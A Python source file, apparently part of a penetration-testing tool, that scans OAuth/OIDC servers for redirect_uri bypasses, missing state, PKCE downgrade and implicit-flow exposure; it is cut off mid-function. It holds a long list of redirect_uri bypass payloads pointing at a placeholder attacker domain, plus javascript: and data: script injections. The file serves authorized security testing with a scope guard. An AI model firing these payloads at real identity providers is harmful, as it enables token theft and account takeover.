"""Automated OAuth/SSO vulnerability detection engine.

Zero LLM cost — pure deterministic HTTP testing.
Detects 20 redirect_uri bypass categories plus state/PKCE/code/DCR attacks.

References:
- CVE-2019-3778, CVE-2023-6291, CVE-2024-1132, CVE-2023-6927, CVE-2024-52289
- CVE-2020-10776, CVE-2023-28131, CVE-2020-5233, CVE-2026-27191
- ACSAC 2023 "How Not to Handle Your Redirections" (6/16 IdPs vulnerable)
- Black Hat Asia 2019 "Make Redirection Evil Again"
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import re
import time
from typing import Any
from urllib.parse import (
    parse_qs,
    quote,
    urlencode,
    urljoin,
    urlparse,
    urlunparse,
)

import httpx
import structlog

from ai_brain.active.deterministic_tools import _make_client
from ai_brain.active.scope_guard import ActiveScopeGuard

logger = structlog.get_logger()

# Non-resolving attacker domain for payload generation — safe for detection.
_EVIL_DOMAIN = "evil.example.com"
_EVIL_URL = f"https://{_EVIL_DOMAIN}/callback"

# Well-known discovery paths
_OIDC_DISCOVERY_PATHS = [
    "/.well-known/openid-configuration",
    "/.well-known/oauth-authorization-server",
]

# Common OAuth login button patterns (href regex)
_OAUTH_LINK_RE = re.compile(
    r'href=["\']([^"\']*(?:oauth|authorize|auth/login|signin|connect)'
    r'[^"\']*)["\']',
    re.IGNORECASE,
)

# OAuth provider domains for Social Login detection
_OAUTH_PROVIDERS = {
    "accounts.google.com": "Google",
    "www.facebook.com": "Facebook",
    "graph.facebook.com": "Facebook",
    "github.com": "GitHub",
    "login.microsoftonline.com": "Microsoft",
    "appleid.apple.com": "Apple",
    "api.twitter.com": "Twitter",
    "discord.com": "Discord",
    "slack.com": "Slack",
    "gitlab.com": "GitLab",
    "bitbucket.org": "Bitbucket",
    "linkedin.com": "LinkedIn",
    "login.yahoo.com": "Yahoo",
    "auth0.com": "Auth0",
    "okta.com": "Okta",
    "cognito-idp": "AWS Cognito",
}

# Common auth page paths to crawl for OAuth buttons
_AUTH_PAGE_PATHS = [
    "/login",
    "/signin",
    "/sign-in",
    "/auth/login",
    "/oauth/login",
    "/sso/login",
    "/account/login",
    "/api/auth/login",
    "/connect",
]

# Dynamic Client Registration paths
_DCR_PATHS = [
    "/register",
    "/connect/register",
    "/oauth/register",
    "/oauth2/register",
    "/clients",
    "/.well-known/openid-configuration",  # may contain registration_endpoint
]

# Error indicators that the redirect_uri was rejected
_REJECT_PATTERNS = [
    "invalid_redirect_uri",
    "redirect_uri_mismatch",
    "invalid redirect",
    "redirect uri",
    "invalid_request",
    "unauthorized_client",
    "does not match",
    "not allowed",
    "not registered",
    "not whitelisted",
    "mismatching_redirect_uri",
]


def _make_oauth_client(socks_proxy: str | None = None) -> httpx.AsyncClient:
    """Create an httpx client for OAuth testing (no redirect following)."""
    return _make_client(
        socks_proxy=socks_proxy,
        timeout=10,
        follow_redirects=False,
    )


def _is_redirect_accepted(resp: httpx.Response, malicious_uri: str) -> bool:
    """Check if the server accepted the malicious redirect_uri.

    Vulnerable indicators:
    - 302/301/303/307/308 with Location containing the malicious domain
    - 200 with form action pointing to malicious URI (consent page)
    """
    evil_domain = urlparse(malicious_uri).hostname or _EVIL_DOMAIN

    if resp.status_code in (301, 302, 303, 307, 308):
        location = resp.headers.get("location", "")
        # Check if the redirect goes to or includes the evil domain
        if evil_domain in location:
            return True
        # Check if redirect_uri param in location contains evil domain
        parsed = urlparse(location)
        qs = parse_qs(parsed.query)
        for val_list in qs.values():
            for val in val_list:
                if evil_domain in val:
                    return True
        return False

    if resp.status_code == 200:
        body = resp.text[:5000]
        # Check for consent form action pointing to evil domain
        if evil_domain in body:
            # Make sure it's in a meaningful context, not just an error message
            if f'action="{malicious_uri}' in body or f"action='{malicious_uri}" in body:
                return True
        return False

    return False


def _is_redirect_rejected(resp: httpx.Response) -> bool:
    """Check if the server explicitly rejected the redirect_uri."""
    if resp.status_code in (400, 403, 401):
        return True
    # Redirect responses typically have no body worth checking
    if resp.status_code in (301, 302, 303, 307, 308):
        return False
    body = resp.text[:3000].lower()
    return any(p in body for p in _REJECT_PATTERNS)


class OAuthAttackEngine:
    """Automated OAuth/SSO vulnerability detection. $0 LLM cost.

    Tests 20 redirect_uri bypass categories plus state/PKCE/code/DCR attacks
    against OAuth authorization endpoints.
    """

    def __init__(
        self,
        scope_guard: ActiveScopeGuard | None = None,
        socks_proxy: str | None = None,
    ):
        self._scope_guard = scope_guard
        self._socks_proxy = socks_proxy
        self._request_count = 0
        self._rate_delay = 0.3  # 300ms between requests to avoid rate limiting

    def _in_scope(self, url: str) -> bool:
        """Check if a URL is in scope."""
        if not self._scope_guard:
            return True
        return self._scope_guard.is_in_scope(url)

    async def _send(
        self, client: httpx.AsyncClient, method: str, url: str, **kwargs: Any
    ) -> httpx.Response | None:
        """Send an HTTP request with rate limiting and error handling."""
        if not self._in_scope(url):
            logger.warning("oauth_scope_violation", url=url[:120])
            return None
        self._request_count += 1
        await asyncio.sleep(self._rate_delay)
        try:
            return await client.request(method, url, **kwargs)
        except Exception as e:
            logger.debug("oauth_request_error", url=url[:120], error=str(e)[:100])
            return None

    # ──────────────────────────────────────────────────────────────────
    # Discovery
    # ──────────────────────────────────────────────────────────────────

    async def discover_oauth_endpoints(self, target_url: str) -> dict[str, Any]:
        """Find OAuth authorization endpoints, token endpoints, OIDC discovery.

        Returns:
            {
                auth_endpoint, token_endpoint, client_ids, redirect_uris,
                providers, registration_endpoint, issuer, discovery_source
            }
        """
        result: dict[str, Any] = {
            "auth_endpoint": "",
            "token_endpoint": "",
            "registration_endpoint": "",
            "issuer": "",
            "client_ids": [],
            "redirect_uris": [],
            "providers": [],
            "discovery_source": "",
            "scopes_supported": [],
            "response_types_supported": [],
            "grant_types_supported": [],
        }

        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        async with _make_oauth_client(self._socks_proxy) as client:
            # 1. Try OIDC/.well-known discovery
            for path in _OIDC_DISCOVERY_PATHS:
                disco_url = base_url + path
                resp = await self._send(client, "GET", disco_url)
                if resp and resp.status_code == 200:
                    try:
                        config = resp.json()
                        result["auth_endpoint"] = config.get(
                            "authorization_endpoint", ""
                        )
                        result["token_endpoint"] = config.get("token_endpoint", "")
                        result["registration_endpoint"] = config.get(
                            "registration_endpoint", ""
                        )
                        result["issuer"] = config.get("issuer", "")
                        result["scopes_supported"] = config.get(
                            "scopes_supported", []
                        )
                        result["response_types_supported"] = config.get(
                            "response_types_supported", []
                        )
                        result["grant_types_supported"] = config.get(
                            "grant_types_supported", []
                        )
                        result["discovery_source"] = path
                        logger.info(
                            "oidc_discovery_found",
                            path=path,
                            auth=result["auth_endpoint"][:80],
                        )
                        break
                    except (json.JSONDecodeError, ValueError):
                        pass

            # 2. Crawl auth pages for OAuth login buttons
            for auth_path in _AUTH_PAGE_PATHS:
                page_url = base_url + auth_path
                resp = await self._send(client, "GET", page_url,
                                        follow_redirects=True)
                if not resp or resp.status_code != 200:
                    continue

                body = resp.text
                # Find OAuth links
                for match in _OAUTH_LINK_RE.finditer(body):
                    href = match.group(1)
                    # Resolve relative URLs
                    if href.startswith("/"):
                        href = base_url + href
                    elif not href.startswith("http"):
                        href = urljoin(page_url, href)

                    link_parsed = urlparse(href)
                    link_host = link_parsed.hostname or ""

                    # Check if this is a known OAuth provider
                    for domain, provider in _OAUTH_PROVIDERS.items():
                        if domain in link_host:
                            if provider not in result["providers"]:
                                result["providers"].append(provider)
                            break

                    # Extract client_id and redirect_uri from query params
                    qs = parse_qs(link_parsed.query)
                    cid = qs.get("client_id", [None])[0]
                    ruri = qs.get("redirect_uri", [None])[0]
                    if cid and cid not in result["client_ids"]:
                        result["client_ids"].append(cid)
                    if ruri and ruri not in result["redirect_uris"]:
                        result["redirect_uris"].append(ruri)

                    # Extract auth endpoint from known providers
                    if not result["auth_endpoint"] and "authorize" in href.lower():
                        # Strip query params to get base auth endpoint
                        result["auth_endpoint"] = urlunparse(
                            link_parsed._replace(query="", fragment="")
                        )
                        result["discovery_source"] = f"link on {auth_path}"

                # Also look for hidden OAuth links in JavaScript
                # Pattern: window.location = "https://.../authorize?..."
                js_oauth = re.findall(
                    r'(?:window\.location|location\.href)\s*=\s*["\']'
                    r'(https?://[^"\']*authorize[^"\']*)["\']',
                    body,
                )
                for href in js_oauth:
                    link_parsed = urlparse(href)
                    qs = parse_qs(link_parsed.query)
                    cid = qs.get("client_id", [None])[0]
                    ruri = qs.get("redirect_uri", [None])[0]
                    if cid and cid not in result["client_ids"]:
                        result["client_ids"].append(cid)
                    if ruri and ruri not in result["redirect_uris"]:
                        result["redirect_uris"].append(ruri)
                    if not result["auth_endpoint"]:
                        result["auth_endpoint"] = urlunparse(
                            link_parsed._replace(query="", fragment="")
                        )
                        result["discovery_source"] = f"JS on {auth_path}"

        result["requests_made"] = self._request_count
        return result

    # ──────────────────────────────────────────────────────────────────
    # Redirect URI Bypass Testing (20 categories)
    # ──────────────────────────────────────────────────────────────────

    def _build_redirect_uri_payloads(
        self, legitimate_redirect: str
    ) -> list[dict[str, str]]:
        """Build all 20 categories of redirect_uri bypass payloads.

        Returns list of {technique, category, payload, description}.
        """
        parsed = urlparse(legitimate_redirect)
        legit_scheme = parsed.scheme or "https"
        legit_host = parsed.hostname or ""
        legit_port = parsed.port
        legit_path = parsed.path or "/"
        # Base URL without path
        legit_base = f"{legit_scheme}://{legit_host}"
        if legit_port and legit_port not in (80, 443):
            legit_base += f":{legit_port}"

        payloads: list[dict[str, str]] = []

        def add(technique: str, category: str, payload: str, desc: str) -> None:
            payloads.append(
                {
                    "technique": technique,
                    "category": category,
                    "payload": payload,
                    "description": desc,
                }
            )

        # ── 1. Open redirect to arbitrary domain ──
        add(
            "open_redirect",
            "1_arbitrary_domain",
            _EVIL_URL,
            "No validation — arbitrary domain accepted",
        )

        # ── 2. Subdomain/domain-suffix bypass ──
        add(
            "subdomain_bypass",
            "2_domain_suffix",
            f"https://{legit_host}.{_EVIL_DOMAIN}/callback",
            "Subdomain of attacker: legitimate.com.evil.example.com",
        )
        add(
            "subdomain_bypass",
            "2_domain_suffix",
            f"https://{_EVIL_DOMAIN}.{legit_host}/callback",
            "Attacker as subdomain: evil.example.com.legitimate.com",
        )
        add(
            "subdomain_bypass",
            "2_domain_suffix",
            f"https://not{legit_host}{legit_path}",
            "Prefix match bypass: notlegitimate.com",
        )

        # ── 3. Path traversal ──
        add(
            "path_traversal",
            "3_path_traversal",
            f"{legit_base}/callback/../../../attacker-controlled",
            "Path traversal with /../",
        )
        add(
            "path_traversal",
            "3_path_traversal",
            f"{legit_base}/callback/..%2F..%2Fattacker-controlled",
            "Path traversal with encoded %2F",
        )
        add(
            "path_traversal",
            "3_path_traversal",
            f"{legit_base}/%2e%2e/%2e%2e/attacker-controlled",
            "Path traversal with fully encoded dots",
        )

        # ── 4. Parameter pollution ──
        add(
            "param_pollution",
            "4_param_pollution",
            f"{legitimate_redirect}&redirect_uri={_EVIL_URL}",
            "Duplicate redirect_uri parameter appended",
        )
        add(
            "param_pollution",
            "4_param_pollution",
            f"{legitimate_redirect}%26redirect_uri%3D{quote(_EVIL_URL)}",
            "Encoded duplicate redirect_uri",
        )

        # ── 5. URL encoding bypass ──
        add(
            "url_encoding",
            "5_url_encoding",
            f"{legit_base}%2Fcallback%2F@{_EVIL_DOMAIN}",
            "Encoded path with @ injection",
        )
        add(
            "url_encoding",
            "5_url_encoding",
            f"{legit_scheme}://{legit_host}%40{_EVIL_DOMAIN}/callback",
            "Encoded @ between domains",
        )
        add(
            "url_encoding",
            "5_url_encoding",
            f"{legit_base}{legit_path}%23@{_EVIL_DOMAIN}",
            "Encoded # fragment injection",
        )

        # ── 6. Double URL encoding ──
        add(
            "double_encoding",
            "6_double_encoding",
            f"{legit_base}/callback%252F..%252F..%252Fattacker",
            "Double-encoded path traversal (%252F -> %2F -> /)",
        )
        add(
            "double_encoding",
            "6_double_encoding",
            f"{legit_base}%252F%252F{_EVIL_DOMAIN}/callback",
            "Double-encoded slashes",
        )

        # ── 7. Fragment/userinfo injection ──
        add(
            "userinfo_injection",
            "7_userinfo_fragment",
            f"{legit_scheme}://{legit_host}@{_EVIL_DOMAIN}/callback",
            "Userinfo @ bypass: legitimate.com@evil.example.com",
        )
        add(
            "userinfo_injection",
            "7_userinfo_fragment",
            f"{legitimate_redirect}#{_EVIL_URL}",
            "Fragment injection: append #evil.example.com",
        )
        add(
            "userinfo_injection",
            "7_userinfo_fragment",
            f"{legit_scheme}://foo:bar@{_EVIL_DOMAIN}/callback",
            "Full userinfo bypass with credentials",
        )

        # ── 8. Localhost/127.0.0.1 bypass ──
        add(
            "localhost_bypass",
            "8_localhost",
            "http://localhost/callback",
            "localhost whitelisting",
        )
        add(
            "localhost_bypass",
            "8_localhost",
            "http://127.0.0.1/callback",
            "127.0.0.1 whitelisting",
        )
        add(
            "localhost_bypass",
            "8_localhost",
            "http://0.0.0.0/callback",
            "0.0.0.0 whitelisting",
        )
        add(
            "localhost_bypass",
            "8_localhost",
            "http://127.1/callback",
            "Shortened 127.1 loopback",
        )

        # ── 9. Scheme change ──
        add(
            "scheme_change",
            "9_scheme",
            f"http://{legit_host}{legit_path}",
            "HTTPS to HTTP downgrade",
        )
        add(
            "scheme_change",
            "9_scheme",
            "javascript://comment%0Aalert(document.domain)",
            "javascript: scheme injection",
        )
        add(
            "scheme_change",
            "9_scheme",
            "data:text/html,<script>alert(1)</script>",
            "data: scheme injection",
        )

        # ── 10. Wildcard matching bypass ──
        add(
            "wildcard_bypass",
            "10_wildcard",
            f"{legit_base}/callback/../evil",
            "Wildcard path with traversal",
        )
        add(
            "wildcard_bypass",
            "10_wildcard",
            f"{legit_base}/anything/evil",
            "Wildcard deep path",
        )
        add(
            "wildcard_bypass",
            "10_wildcard",
            f"{legit_base}/callback?to={_EVIL_URL}",
            "Wildcard with query param redirect",
        )

        # ── 11. Unicode normalization ──
        # Cyrillic homoglyphs that normalize differently
        add(
            "unicode_normalization",
            "11_unicode",
            # Cyrillic 'а' (U+0430) looks like Latin 'a'
            f"https://{legit_host.replace('a', chr(0x0430)) if 'a' in legit_host else legit_host + chr(0x0430)}{legit_path}",
            "Cyrillic homoglyph (а U+0430 for a)",
        )
        add(
            "unicode_normalization",
            "11_unicode",
            f"https://{legit_host.replace('o', chr(0x043E)) if 'o' in legit_host else legit_host}{legit_path}",
            "Cyrillic homoglyph (о U+043E for o)",
        )

        # ── 12. Backslash vs forward slash ──
        add(
            "backslash_confusion",
            "12_backslash",
            f"{legit_scheme}://{legit_host}\\@{_EVIL_DOMAIN}/callback",
            r"Backslash as path separator: legit\@evil",
        )
        add(
            "backslash_confusion",
            "12_backslash",
            f"{legit_base}\\..\\..\\{_EVIL_DOMAIN}",
            "Backslash path traversal",
        )

        # ── 13. @ symbol bypass ──
        add(
            "at_symbol",
            "13_at_symbol",
            f"{legit_scheme}://{legit_host}%40{_EVIL_DOMAIN}",
            "Encoded @ in host (%40)",
        )
        add(
            "at_symbol",
            "13_at_symbol",
            f"{legit_scheme}://{_EVIL_DOMAIN}%40{legit_host}/callback",
            "Reversed @ bypass",
        )

        # ── 14. Null byte injection ──
        add(
            "null_byte",
            "14_null_byte",
            f"{legitimate_redirect}%00.{_EVIL_DOMAIN}",
            "Null byte truncation with appended domain",
        )
        add(
            "null_byte",
            "14_null_byte",
            f"{legit_base}/callback%00/{_EVIL_DOMAIN}",
            "Null byte in path",
        )

        # ── 15. Open redirect chain ──
        # Inject a redirect via query param on legitimate path
        add(
            "open_redirect_chain",
            "15_redirect_chain",
            f"{legit_base}/login?next={quote(_EVIL_URL)}",
            "Open redirect chain via login?next=",
        )
        add(
            "open_redirect_chain",
            "15_redirect_chain",
            f"{legit_base}/redirect?url={quote(_EVIL_URL)}",
            "Open redirect chain via redirect?url=",
        )
        add(
            "open_redirect_chain",
            "15_redirect_chain",
            f"{legit_base}/logout?returnTo={quote(_EVIL_URL)}",
            "Open redirect chain via logout?returnTo=",
        )

        # ── 16. Dangerous URI schemes ──
        add(
            "dangerous_scheme",
            "16_dangerous_uri",
            "javascript:alert(document.cookie)//",
            "javascript: scheme (token theft)",
        )
        add(
            "dangerous_scheme",
            "16_dangerous_uri",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "data: scheme with base64 HTML",
        )
        add(
            "dangerous_scheme",
            "16_dangerous_uri",
            f"javascript:void(0)//{legit_host}",
            "javascript: with legitimate host in comment",
        )

        # ── 17. IDN homograph ──
        add(
            "idn_homograph",
            "17_idn",
            f"https://xn--{legit_host.replace('.', '-')}.{_EVIL_DOMAIN}/callback",
            "IDN homograph with punycode",
        )

        # ── 18. IPv6 address bypass ──
        add(
            "ipv6_bypass",
            "18_ipv6",
            "https://[::1]/callback",
            "IPv6 loopback",
        )
        add(
            "ipv6_bypass",
            "18_ipv6",
            "https://[::ffff:127.0.0.1]/callback",
            "IPv6-mapped IPv4 loopback",
        )
        add(
            "ipv6_bypass",
            "18_ipv6",
            "https://[0:0:0:0:0:0:0:1]/callback",
            "Full IPv6 loopback notation",
        )
        add(
            "ipv6_bypass",
            "18_ipv6",
            "http://2130706433/callback",
            "Decimal IP for 127.0.0.1",
        )

        # ── 19. Dot manipulation ──
        add(
            "dot_manipulation",
            "19_dot",
            f"https://{legit_host}./callback",
            "Trailing dot on domain (DNS root)",
        )
        add(
            "dot_manipulation",
            "19_dot",
            f"https://.{legit_host}/callback",
            "Leading dot on domain",
        )
        add(
            "dot_manipulation",
            "19_dot",
            f"https://{legit_host}..{_EVIL_DOMAIN}/callback",
            "Double dot between domains",
        )

        # ── 20. Port-based bypass ──
        add(
            "port_bypass",
            "20_port",
            f"{legit_scheme}://{legit_host}:443/callback",
            "Explicit port 443 (may bypass port check)",
        )
        add(
            "port_bypass",
            "20_port",
            f"{legit_scheme}://{legit_host}:8443/callback",
            "Non-standard port 8443",
        )
        add(
            "port_bypass",
            "20_port",
            f"{legit_scheme}://{legit_host}:80/callback",
            "HTTP port on HTTPS domain",
        )

        return payloads

    async def test_redirect_uri_bypasses(
        self,
        auth_endpoint: str,
        client_id: str,
        legitimate_redirect: str,
    ) -> list[dict[str, Any]]:
        """Test all 20 redirect_uri bypass categories.

        Args:
            auth_endpoint: OAuth authorization endpoint URL.
            client_id: OAuth client_id.
            legitimate_redirect: Known valid redirect_uri.

        Returns:
            List of findings with technique, payload, server response details.
        """
        if not auth_endpoint or not client_id:
            return [{"error": "auth_endpoint and client_id are required"}]

        payloads = self._build_redirect_uri_payloads(legitimate_redirect)
        findings: list[dict[str, Any]] = []

        # First, establish a baseline with the legitimate redirect_uri
        baseline_status = None
        async with _make_oauth_client(self._socks_proxy) as client:
            baseline_params = {
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": legitimate_redirect,
                "scope": "openid",
                "state": hashlib.md5(b"baseline").hexdigest(),
            }
            baseline_url = f"{auth_endpoint}?{urlencode(baseline_params)}"
            baseline_resp = await self._send(client, "GET", baseline_url)
            if baseline_resp:
                baseline_status = baseline_resp.status_code
                logger.info(
                    "oauth_baseline",
                    status=baseline_status,
                    location=baseline_resp.headers.get("location", "")[:100],
                )

            # Test each payload
            for payload_info in payloads:
                malicious_uri = payload_info["payload"]
                params = {
                    "response_type": "code",
                    "client_id": client_id,
                    "redirect_uri": malicious_uri,
                    "scope": "openid",
                    "state": hashlib.md5(
                        malicious_uri.encode(errors="replace")
                    ).hexdigest()[:16],
                }
                test_url = f"{auth_endpoint}?{urlencode(params)}"
                resp = await self._send(client, "GET", test_url)
                if not resp:
                    continue

                accepted = _is_redirect_accepted(resp, malicious_uri)
                rejected = _is_redirect_rejected(resp)

                if accepted:
                    location = resp.headers.get("location", "")
                    finding = {
                        "vulnerable": True,
                        "technique": payload_info["technique"],
                        "category": payload_info["category"],
                        "description": payload_info["description"],
                        "payload": malicious_uri,
                        "response_status": resp.status_code,
                        "redirect_location": location[:500],
                        "evidence": (
                            f"Server accepted malicious redirect_uri and "
                            f"returned HTTP {resp.status_code}. "
                            f"Location: {location[:200]}"
                        ),
                        "severity": _classify_severity(payload_info["technique"]),
                        "cves": _related_cves(payload_info["technique"]),
                    }
                    findings.append(finding)
                    logger.info(
                        "oauth_bypass_found",
                        technique=payload_info["technique"],
                        category=payload_info["category"],
                        status=resp.status_code,
                    )
                else:
                    # Log non-finding for debugging
                    logger.debug(
                        "oauth_bypass_rejected",
                        technique=payload_info["technique"],
                        status=resp.status_code,
                        rejected=rejected,
                    )

        return findings

    # ──────────────────────────────────────────────────────────────────
    # State Parameter Testing
    # ──────────────────────────────────────────────────────────────────

    async def test_state_parameter(
        self,
        auth_endpoint: str,
        client_id: str,
        redirect_uri: str,
    ) -> list[dict[str, Any]]:
        """Test state parameter issues (CSRF on OAuth flow).

        Tests:
        - Auth request without state parameter accepted
        - Auth request with empty state accepted
        - Auth request with predictable state accepted
        """
        findings: list[dict[str, Any]] = []

        if not auth_endpoint or not client_id:
            return [{"error": "auth_endpoint and client_id are required"}]

        async with _make_oauth_client(self._socks_proxy) as client:
            # Test 1: No state parameter
            params_no_state = {
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": redirect_uri,
                "scope": "openid",
            }
            url = f"{auth_endpoint}?{urlencode(params_no_state)}"
            resp = await self._send(client, "GET", url)
            if resp and resp.status_code in (200, 301, 302, 303, 307, 308):
                # Check if the response doesn't inject its own state
                location = resp.headers.get("location", "")
                body = resp.text[:3000] if resp.status_code == 200 else ""
                has_state = "state=" in location or 'name="state"' in body
                if not has_state:
                    findings.append({
                        "vulnerable": True,
                        "technique": "state_missing",
                        "description": (
                            "OAuth flow accepted without state parameter. "
                            "This enables CSRF-based login attacks where attacker "
                            "can force victim to log into attacker's account."
                        ),
                        "response_status": resp.status_code,
                        "severity": "medium",
                        "cves": ["CVE-2018-7307", "CVE-2025-68481"],
                    })

            # Test 2: Empty state
            params_empty = {**params_no_state, "state": ""}
            url = f"{auth_endpoint}?{urlencode(params_empty)}"
            resp = await self._send(client, "GET", url)
            if resp and resp.status_code in (200, 301, 302, 303, 307, 308):
                rejected = _is_redirect_rejected(resp)
                if not rejected:
                    findings.append({
                        "vulnerable": True,
                        "technique": "state_empty",
                        "description": (
                            "OAuth flow accepted with empty state parameter. "
                            "No server-side state enforcement."
                        ),
                        "response_status": resp.status_code,
                        "severity": "low",
                    })

            # Test 3: Predictable state (static value)
            params_predictable = {**params_no_state, "state": "1234"}
            url = f"{auth_endpoint}?{urlencode(params_predictable)}"
            resp = await self._send(client, "GET", url)
            if resp and resp.status_code in (200, 301, 302, 303, 307, 308):
                location = resp.headers.get("location", "")
                # If the server echoes back our static state without modification
                if "state=1234" in location:
                    findings.append({
                        "vulnerable": True,
                        "technique": "state_predictable",
                        "description": (
                            "Server echoes back user-supplied state without "
                            "binding it to a session. Attacker can use a fixed "
                            "state value for cross-site request forgery."
                        ),
                        "response_status": resp.status_code,
                        "severity": "medium",
                    })

        return findings

    # ──────────────────────────────────────────────────────────────────
    # PKCE Downgrade Testing
    # ──────────────────────────────────────────────────────────────────

    async def test_pkce_downgrade(
        self,
        auth_endpoint: str,
        token_endpoint: str,
        client_id: str,
        redirect_uri: str = "",
    ) -> list[dict[str, Any]]:
        """Test PKCE downgrade attacks.

        Tests:
        - Auth request with code_challenge accepted but token exchange
          without code_verifier also accepted
        - S256 downgrade to plain method
        - Missing PKCE enforcement (flow works without code_challenge)
        """
        findings: list[dict[str, Any]] = []

        if not auth_endpoint or not client_id:
            return [{"error": "auth_endpoint and client_id are required"}]

        ruri = redirect_uri or f"https://{urlparse(auth_endpoint).hostname}/callback"
        code_verifier = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
        code_challenge = "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"

        async with _make_oauth_client(self._socks_proxy) as client:
            # Test 1: Send auth request WITH code_challenge
            params_pkce = {
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": ruri,
                "scope": "openid",
                "state": "pkce_test",
                "code_challenge": code_challenge,
                "code_challenge_method": "S256",
            }
            url_pkce = f"{auth_endpoint}?{urlencode(params_pkce)}"
            resp_pkce = await self._send(client, "GET", url_pkce)
            pkce_accepted = resp_pkce and resp_pkce.status_code in (
                200, 302, 303, 307,
            )

            # Test 2: Send auth request WITHOUT code_challenge
            params_no_pkce = {
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": ruri,
                "scope": "openid",
                "state": "no_pkce_test",
            }
            url_no_pkce = f"{auth_endpoint}?{urlencode(params_no_pkce)}"
            resp_no_pkce = await self._send(client, "GET", url_no_pkce)
            no_pkce_accepted = resp_no_pkce and resp_no_pkce.status_code in (
                200, 302, 303, 307,
            )

            if pkce_accepted and no_pkce_accepted:
                # Both accepted — PKCE not enforced
                findings.append({
                    "vulnerable": True,
                    "technique": "pkce_not_enforced",
                    "description": (
                        "PKCE is optional — authorization endpoint accepts "
                        "requests both with and without code_challenge. "
                        "Attacker can intercept authorization code and exchange "
                        "it without code_verifier."
                    ),
                    "severity": "medium",
                    "evidence": (
                        f"With PKCE: HTTP {resp_pkce.status_code}. "
                        f"Without PKCE: HTTP {resp_no_pkce.status_code}."
                    ),
                })

            # Test 3: S256 → plain downgrade
            params_plain = {
                "response_type": "code",
                "client_id": client_id,
                "redirect_uri": ruri,
                "scope": "openid",
                "state": "plain_test",
                "code_challenge": code_verifier,  # plain = verifier IS the challenge
                "code_challenge_method": "plain",
            }
            url_plain = f"{auth_endpoint}?{urlencode(params_plain)}"
            resp_plain = await self._send(client, "GET", url_plain)
            if resp_plain and resp_plain.status_code in (200, 302, 303, 307):
                findings.append({
                    "vulnerable": True,
                    "technique": "pkce_plain_allowed",
                    "description": (
                        "Server accepts code_challenge_method=plain. "
                        "This allows attacker to use intercepted code_challenge "
                        "directly as code_verifier, defeating PKCE purpose."
                    ),
                    "severity": "medium",
                    "response_status": resp_plain.status_code,
                })

        return findings

    # ──────────────────────────────────────────────────────────────────
    # Authorization Code Reuse Testing
    # ──────────────────────────────────────────────────────────────────

    async def test_code_reuse(
        self,
        token_endpoint: str,
        client_id: str,
    ) -> list[dict[str, Any]]:
        """Test authorization code reuse.

        Note: This test cannot fully execute without a valid authorization code.
        It checks for the token endpoint existence and notes the test as
        requiring manual verification.
        """
        findings: list[dict[str, Any]] = []

        if not token_endpoint:
            return [{"info": "No token endpoint found. Cannot test code reuse."}]

        async with _make_oauth_client(self._socks_proxy) as client:
            # Verify token endpoint exists
            resp = await self._send(client, "POST", token_endpoint, data={
                "grant_type": "authorization_code",
                "client_id": client_id,
                "code": "INVALID_TEST_CODE_12345",
                "redirect_uri": "https://example.com/callback",
            })
            if resp:
                body = resp.text[:1000].lower()
                findings.append({
                    "info": True,
                    "technique": "code_reuse",
                    "description": (
                        "Token endpoint exists and is reachable. "
                        "Authorization code reuse testing requires a valid code "
                        "(manual verification needed). Server response to invalid "
                        f"code: HTTP {resp.status_code}."
                    ),
                    "response_status": resp.status_code,
                    "needs_manual_verification": True,
                    "severity": "info",
                    # Check if error message reveals useful info
                    "error_response_snippet": body[:300],
                })

        return findings

    # ──────────────────────────────────────────────────────────────────
    # Token Leakage via Referer
    # ──────────────────────────────────────────────────────────────────

    async def test_token_leakage(
        self,
        auth_endpoint: str,
        client_id: str,
        redirect_uri: str,
    ) -> list[dict[str, Any]]:
        """Test if token/code can leak via Referer header.

        Checks if response_type=token (implicit flow) is supported,
        which puts the access_token in the URL fragment — vulnerable
        to Referer leakage if the page loads external resources.
        """
        findings: list[dict[str, Any]] = []

        if not auth_endpoint or not client_id:
            return [{"error": "auth_endpoint and client_id are required"}]

        async with _make_oauth_client(self._socks_proxy) as client:
            # Test implicit flow (response_type=token)
            params = {
                "response_type": "token",
                "client_id": client_id,
                "redirect_uri": redirect_uri,
                "scope": "openid",
                "state": "implicit_test",
            }
            url = f"{auth_endpoint}?{urlencode(params)}"
            resp = await self._send(client, "GET", url)
            if resp and resp.status_code in (200, 302, 303, 307):
                rejected = _is_redirect_rejected(resp)
                if not rejected:
                    findings.append({
                        "vulnerable": True,
                        "technique": "implicit_flow_enabled",
                        "description": (
                            "Implicit flow (response_type=token) is accepted. "
                            "Access tokens are placed in URL fragment (#access_token=...) "
                            "which can leak via Referer headers to external resources "
                            "loaded on the redirect page."
                        ),
                        "response_status": resp.status_code,
                        "severity": "medium",
                    })

            # Test response_type=code+token (hybrid flow)
            params_hybrid = {
                "response_type": "code token",
                "client_id": client_id,
                "redirect_uri": redirect_uri,
                "scope": "openid",
                "state": "hybrid_test",
            }
            url_hybrid = f"{auth_endpoint}?{urlencode(params_hybrid)}"
            resp_hybrid = await self._send(client, "GET", url_hybrid)
            if resp_hybrid and resp_hybrid.status_code in (200, 302, 303, 307):
                rejected = _is_redirect_rejected(resp_hybrid)
                if not rejected:
                    findings.append({
                        "vulnerable": True,
                        "technique": "hybrid_flow_enabled",
                        "description": (
                            "Hybrid flow (response_type=code token) is accepted. "
                            "Both authorization code and access token returned, "
                            "increasing exposure surface."
                        ),
                        "response_status": resp_hybrid.status_code,
                        "severity": "low",
                    })

        return findings

    # ──────────────────────────────────────────────────────────────────
    # Dynamic Client Registration Abuse
    # ──────────────────────────────────────────────────────────────────

    async def test_dcr_abuse(self, target_url: str) -> list[dict[str, Any]]:
        """Test Dynamic Client Registration (DCR) endpoints for abuse.

        Checks:
        - Open registration (no auth required)
        - SSRF via logo_uri, client_uri, policy_uri, tos_uri
        - XSS via client_name
        - Arbitrary redirect_uri registration
        """
        findings: list[dict[str, Any]] = []
        parsed = urlparse(target_url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        # Check for registration endpoint from OIDC discovery
        registration_endpoint = ""
